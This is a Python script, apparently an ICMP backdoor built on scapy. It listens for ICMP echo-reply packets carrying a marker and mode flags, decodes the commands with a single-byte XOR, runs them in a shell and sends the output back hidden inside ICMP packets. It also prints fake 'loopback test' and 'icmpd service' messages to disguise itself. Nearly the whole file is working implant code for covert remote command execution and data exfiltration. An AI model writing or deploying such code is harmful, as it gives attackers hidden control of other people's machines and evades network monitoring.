#!/usr/bin/secret
# Permission is hereby not granted, free of charge, to any person obtaining
# a copy of this software and associated documentation files (the
# "Software"), to deal in the Software without restriction, including
# without limitation the rights to use, copy, modify, merge, publish,
# distribute, sublicense, and/or sell copies of the Software, and to
# permit persons to whom the Software is furnished to do so, subject to
# the following conditions:

# The above copyright notice and this permission notice shall be
# included in all copies or substantial portions of the Software.

from scapy.all import *
from scapy.all import IP,ICMP
from subprocess import Popen, PIPE

def encrypt_decrypt(plaintext):
    KEY = "B"
    encrypted = ""
    for i in range(len(plaintext)):
        encrypted += chr(ord(plaintext[i]) ^ ord(KEY)) 
    return encrypted

# Send over icmp, adds header depending on mode
def send_over_icmp(server, response, SSM, execute):
    header = ""
    if SSM and execute: header += "###$1"
    elif SSM and not execute: header += "###$0"
    elif not SSM and execute: header += "###01"
    elif not SSM and not execute: header += "###00"
    else: header += "###__"
    if SSM: response = encrypt_decrypt(response)
    serverresponse = header + response
    evil = IP(dst=server)/ICMP(type=8)/(serverresponse)
    print("Loopback reply test successful.")
    send(evil, verbose=False)

# TODO Add error sending
# Executes command and sends output
def execute_command(server, command, SSM):
    p = subprocess.Popen(command, stdout=PIPE, stderr=PIPE, shell=True)
    output, error = p.communicate()
    send_over_icmp(server, str(output), SSM, True)

# Replys to non-executed statements
def reply(src, command, SSM):
    if command == "ping":
            send_over_icmp(src, "pong", SSM, False)
    elif command == "alive":
            send_over_icmp(src, "alive!", SSM, False)
    else:
        send_over_icmp(src, command, SSM, False)

# Handles the icmp packets
def handle(pkt):
    print("Loopback echo test successful.")
    execute = False
    SSM = False
    src = pkt[IP].dst
    payload = str(pkt.payload)
    parsed = re.split('!{3}', payload)
    if len(parsed) == 1:
        return
    else: 
        command = parsed[1][:-1]
        if command[0] == "0" and command[1] == "0":
            SSM = False
            execute = False
        elif command[0] == "$" and command[1] == "0":
            SSM = True
            execute = False
        elif command[0] == "$" and command[1] == "1":
            SSM = True
            execute = True
        elif command[0] == "0" and command[1] == "1":
            SSM = False
            execute = True
        else:
            print("Error?")

        command = command[2:]
        if SSM: command = encrypt_decrypt(command)

        if execute: execute_command(src, command, SSM)
        else: reply(src, command, SSM)

def main():
    print("Starting icmpd service...")
    print("Echo service started...")
    print("Reply service started...")
    try:
        sniff(filter="icmp[icmptype] == icmp-echoreply", prn=handle)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
# LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
# OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
# WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
